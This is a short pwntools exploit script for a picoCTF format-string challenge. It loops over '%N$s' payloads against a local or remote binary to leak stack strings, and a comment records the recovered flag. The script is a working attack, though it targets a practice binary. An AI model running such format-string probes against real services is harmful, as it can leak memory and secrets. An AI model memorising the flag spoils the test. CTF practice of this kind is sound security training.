from pwn import *
import sys

def start(argv=[], *a, **kw):
   if args.R:
      return remote(sys.argv[1],sys.argv[2] ,level='warn')
   else:
      return process(elf.path, level='warn')

elf = ELF('./vuln', checksec=False)
for i in range(100):
   try:
      conn=start()
      conn.recvuntil(b'>> ')
      conn.sendline(f'%{i}$s'.encode())
      out = conn.recvall().split(b'\n')[1].decode()
      if 'ctf' in out.lower():
         print(out) # picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
   except:
      pass
